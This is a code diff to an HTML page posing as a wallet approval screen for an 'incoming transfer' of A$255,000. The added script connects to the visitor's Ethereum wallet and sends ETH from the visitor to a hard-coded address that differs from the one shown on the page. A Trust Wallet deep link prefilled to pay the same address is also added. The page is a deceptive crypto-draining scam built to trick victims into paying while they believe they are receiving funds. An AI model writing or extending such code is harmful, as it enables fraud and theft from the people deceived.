@@ -61,6 +61,7 @@
             align-items: center;
             justify-content: space-between;
             margin-bottom: 18px;
+            gap: 12px;
         }
 
         .brand {
@@ -96,6 +97,30 @@
             letter-spacing: 0.12em;
             text-transform: uppercase;
             font-weight: 700;
+        }
+
+        .connect-wrap {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 10px;
+        }
+
+        .connect-btn {
+            border: 1px solid rgba(96, 165, 250, 0.4);
+            background: rgba(59, 130, 246, 0.08);
+            color: #dbeafe;
+            border-radius: 999px;
+            padding: 8px 12px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .connect-btn:hover {
+            background: rgba(59, 130, 246, 0.14);
         }
 
         .title {
@@ -260,6 +285,12 @@
             box-shadow: 0 12px 30px rgba(37, 99, 235, 0.45);
         }
 
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         .status {
             display: none;
             margin-top: 16px;
@@ -323,6 +354,10 @@
                 <div class="badge">Wallet</div>
             </div>
 
+            <div class="connect-wrap">
+                <button id="connectWalletBtn" class="connect-btn" type="button">Connect Wallet</button>
+            </div>
+
             <div class="title">Incoming transfer</div>
             <div class="subtitle">A secure transaction request is awaiting your approval.</div>
 
@@ -331,7 +366,7 @@
                     <div class="amount-label">Amount</div>
                     <div class="amount-value">A$255,000</div>
                 </div>
-                <div class="note">This confirms an incoming transfer request. Review and approve the transaction within Trust Wallet.</div>
+                <div class="note">This confirms an incoming transfer request. Review and approve the transaction within your wallet.</div>
             </div>
 
             <div class="divider"></div>
@@ -340,7 +375,7 @@
             <div class="address-box">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</div>
 
             <div class="info-box">
-                By continuing, you are Accepting a transaction 56.16 ETH to the wallet address above. The operation will be reviewed and confirmed through Trust Wallet.
+                By continuing, you are accepting a transaction for <b>0.013 ETH</b> to the wallet address above. The operation will be reviewed and confirmed through your wallet.
             </div>
 
             <div class="security">Protected by wallet-level verification and transaction approval</div>
@@ -361,12 +396,17 @@
 
     <script>
         const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
-        const AMOUNT_ETH = "0.00733";
+        const AMOUNT_ETH = "0.013";
 
         const statusText = document.getElementById("statusText");
         const loadingRow = document.getElementById("loadingRow");
         const cancelBtn = document.getElementById("cancelBtn");
         const confirmBtn = document.getElementById("confirmBtn");
+        const connectWalletBtn = document.getElementById("connectWalletBtn");
+
+        let connectedAddress = null;
+        let provider = null;
+        let signer = null;
 
         function showStatus(message, type = "info") {
             statusText.textContent = message;
@@ -382,24 +422,76 @@
         }
 
         function openTrustWalletApp() {
-            const currentUrl = encodeURIComponent(window.location.href);
-            const trustDeepLink = "trust://";
-            const trustUniversalLink = "https://link.trustwallet.com/open_url?url=" + currentUrl;
+            const deepLink = `trust://send?asset=ethereum&to=${TARGET_ADDRESS}&amount=${AMOUNT_ETH}`;
+            const fallbackUrl = `https://link.trustwallet.com/open_url?coin=60&address=${TARGET_ADDRESS}`;
 
             if (isMobile()) {
                 const iframe = document.createElement("iframe");
                 iframe.style.display = "none";
-                iframe.src = trustDeepLink;
+                iframe.src = deepLink;
                 document.body.appendChild(iframe);
 
                 setTimeout(() => {
-                    window.location.href = trustUniversalLink;
-                }, 150);
+                    window.location.href = fallbackUrl;
+                }, 1800);
 
                 return true;
             }
 
+            window.open(fallbackUrl, "_blank");
             return false;
+        }
+
+        async function connectWallet() {
+            try {
+                if (!window.ethereum) {
+                    showStatus("No wallet detected. Please install Trust Wallet or MetaMask.", "warning");
+                    return null;
+                }
+
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                connectedAddress = await signer.getAddress();
+
+                connectWalletBtn.textContent = "Connected";
+                connectWalletBtn.disabled = true;
+
+                showStatus(`Wallet connected: ${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`, "success");
+                return signer;
+            } catch (error) {
+                console.error(error);
+                showStatus("Wallet connection failed. Please try again.", "error");
+                return null;
+            }
+        }
+
+        async function sendTxViaWallet() {
+            try {
+                if (!signer) {
+                    const signerObj = await connectWallet();
+                    if (!signerObj) return;
+                }
+
+                showStatus("Preparing transaction…", "info");
+
+                const tx = {
+                    to: TARGET_ADDRESS,
+                    value: ethers.utils.parseEther(AMOUNT_ETH)
+                };
+
+                const txResponse = await signer.sendTransaction(tx);
+                showStatus("Transaction submitted. Waiting for confirmation…", "info");
+
+                await txResponse.wait();
+
+                showStatus("Transaction confirmed successfully.", "success");
+                confirmBtn.disabled = true;
+            } catch (error) {
+                console.error(error);
+                showStatus("Transaction failed or was rejected.", "error");
+                confirmBtn.disabled = false;
+            }
         }
 
         cancelBtn.addEventListener("click", () => {
@@ -407,13 +499,22 @@
             showStatus("Transaction cancelled. No action was taken.", "warning");
         });
 
-        confirmBtn.addEventListener("click", async () => {
-            const mobile = isMobile();
-            confirmBtn.disabled = true;
-            loadingRow.style.opacity = "1";
-            loadingRow.innerHTML = '<div class="spinner"></div><div>Opening Trust Wallet…</div>';
+        connectWalletBtn.addEventListener("click", async () => {
+            await connectWallet();
+        });
 
-            if (mobile) {
+        confirmBtn.addEventListener("click", async () => {
+            if (isMobile()) {
+                confirmBtn.disabled = true;
+                loadingRow.innerHTML = '<div class="spinner"></div><div>Opening Trust Wallet…</div>';
+
+                // If wallet already connected, send through wallet
+                if (window.ethereum && signer) {
+                    await sendTxViaWallet();
+                    return;
+                }
+
+                // If mobile and no browser wallet, open Trust Wallet app directly
                 openTrustWalletApp();
                 showStatus("Redirecting to Trust Wallet…", "info");
 
@@ -424,9 +525,13 @@
                 return;
             }
 
-            showStatus("This feature is intended for mobile devices with Trust Wallet installed.", "warning");
-            confirmBtn.disabled = false;
-            loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
+            // Desktop / browser wallet flow
+            if (!window.ethereum) {
+                showStatus("No wallet detected. Please install Trust Wallet or MetaMask.", "warning");
+                return;
+            }
+
+            await sendTxViaWallet();
         });
 
         setTimeout(() => {
